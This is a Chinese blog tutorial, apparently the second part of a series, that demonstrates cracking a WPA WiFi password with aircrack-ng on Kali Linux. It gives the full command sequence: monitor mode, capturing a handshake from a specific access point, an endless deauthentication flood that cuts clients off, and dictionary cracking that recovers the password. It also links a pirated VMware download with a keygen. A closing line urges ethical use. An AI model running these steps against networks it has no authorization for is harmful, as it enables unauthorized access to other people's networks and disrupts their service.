了解了上篇：[aircrack-ng无线网WIFI破解教程(上) – WIFI破解原理](http://www.vuln.cn/2674)后，下篇给大家来实战wifi破解。

### 工具准备

> 1：虚拟机
> 2：linux系统（bt或者kali）
> 3：无线网卡
> 4：aircrack-ng软件（一般kali会默认集成了这个工具）
> 5：wpa字典

### 工具下载

- [VMware Workstation 12.0.0 Pro 正式版下载【附注册机+注册码】](http://www.qiankoo.com/thread-3990-1-1.html)
- kali 2.0下载地址：https://www.kali.org/downloads/
- wpa字典：链接：http://pan.baidu.com/s/1nurkUfB 密码：ofit

 

这次实战演示的工具：电脑：surface pro3，usb无线网卡：TL-WN722N，虚拟机：vmware 12，虚拟机系统：kali2.0，破解工具：aircrack-ng

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi11.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi11.jpg)

### 准备工作

安装好vmware，在vmware上装好kali系统，加载好本机无线网卡或者USB无线网卡，确保处于连接状态。

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi12.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi12.jpg)

 

### 视频版

###  使用aircrack-ng抓包

iwconfig命令查看无线网卡有没有加载成功，如图，出现了wlan0的无线设备，即为加载成功
[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi2.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi2.jpg)

查看周围网络

**airodump-ng wlan0 **

很多情况下会发生如下所示的报错：“ioctl(SIOCSIWMODE) failed: Device or resource busy”

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi3.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi3.jpg)

这种情况我们需要先卸载设备，然后设置monitor模式，重新启用即可！命令：

> ifconfig wlan0 down
>
> iwconfig wlan0 mode monitor
>
> ifconfig wlan0 up

运行完这三个命令后再次运行airodump wlan0，查看需要破解的网在哪个频道（CH），数据传输量(Beacons)如何。

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi4.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi4.jpg)

接下来开始抓我们想要的包：

**airodump -w sofia -c 3 wlan0**

解释：-w表示保存握手包，“sofia”为包的名称，可随意设置，最终的文件为sofia-01.cap，-c 3表示指定频道3，wlan0指定网卡设备。

如图，即开始在抓频道3上的包（包含我们需要破解的Tenda_5E93C0）

当然我们也可以指定破解我们想要的AP

**airodump -w sofia -c 3 --bssid C8:3A:35:5E:93:C0 wlan0**

解释：--bssid嗅探指定无线AP，后面跟着AP的bssid，如下图

这时候可以等待握手包的获取。

**英文解释：**

> 1.BSSID--无线AP（路由器）的MAC地址，如果你想PJ哪个路由器的密码就把这个信息记下来备用。
> 2.PWR--这个值的大小反应信号的强弱，越大越好。很重要！！！
> 3.RXQ--丢包率，越小越好，此值对PJ密码影响不大，不必过于关注、
> 4.Beacons--准确的含义忘记了，大致就是反应客户端和AP的数据交换情况，通常此值不断变化。
> 5.#Data--这个值非常重要，直接影响到密码PJ的时间长短，如果有用户正在下载文件或看电影等大量数据传输的话，此值增长较快。 
> 6.CH--工作频道。
> 7.MB--连接速度
> 8.ENC--编码方式。通常有WEP、WPA、TKIP等方式，本文所介绍的方法在WEP下测试100%成功，其余方式本人 并未验证。
> 9.ESSID--可以简单的理解为局域网的名称，就是通常我们在搜索无线网络时看到的列表里面的各个网络的名称。

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi5.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi5.jpg)

为了加速握手包的获取，我们可以使用aireplay来给AP发送断开包：

**aireplay-ng -0 0 -a C8:3A:35:5E:93:C0**

解释：-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值，上图可以一目了然。

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi6.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi6.jpg)

这时候我们在右上角可以看到WPA handshake字样，后面跟着bssid，即为抓到了该无线网的握手包，我们可以使用CTRL+C来停止嗅探握手包。

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi7.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi7.jpg)

### 使用字典爆破握手包

这一步是整个密码破解的关键，能否成功，取决与你的CPU是否强大，还有你字典的大小，以及字典的质量，密码的复杂程度。

**aircrack-ng sofia-01.cap -w /root/sofia/wifi-hack/dic/wpa专用.txt**

解释：“sofia-01.cap”为指定我们需要破解的握手包，直接写文件名表示文件在当前文件夹下，"-w"指定字典文件后面跟着字典的路径。

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi8.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi8.jpg)

如图正在爆破，

[![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi9.jpg)](http://www.vuln.cn/wp-content/uploads/2016/02/wifi9.jpg)由于这个密码比较简单，一会密码就出来了，为“11112222”
![aircrack-ngwifi破解](http://www.vuln.cn/wp-content/uploads/2016/02/wifi10.jpg)

以上就是教程的全部，对于从来没接触过的新手来说可能有一定的难度，如果在哪一步上出现意外也是正常的，无论我教程写的再详细，也敌不过现实中的意外情况，不同的电脑，不同的网络环境都可能会影响破解的差异性，所以希望大家能够多多练习，熟能生巧。

另外希望大家善用技术，不要做危害他人的事情，无论你技术怎样，做人还是要厚道的，因为螳螂捕蝉黄雀在后的事情还是很常见的（别人能嗅探你的流量）

另一方面希望大家能够通过上下篇教程能够意识到弱口令的危害，加强网络安全意识。